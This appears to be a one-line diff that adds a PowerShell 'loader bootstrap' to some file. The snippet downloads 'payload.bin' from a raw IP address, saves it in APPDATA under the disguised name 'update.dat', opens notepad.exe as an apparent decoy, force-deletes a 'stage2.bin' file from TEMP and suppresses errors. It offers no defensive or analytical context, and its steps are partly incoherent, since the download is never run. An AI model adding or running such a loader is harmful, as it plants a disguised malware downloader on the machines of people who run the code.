@@ -1,0 +1,1 @@
+<# Loader bootstrap #> try { Start-BitsTransfer -Source 'http://198.51.100.119/payload.bin' -Destination "$env:APPDATA\update.dat"; & 'notepad.exe'; Remove-Item -Path "$env:TEMP\stage2.bin" -Force; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Loader step failed" }
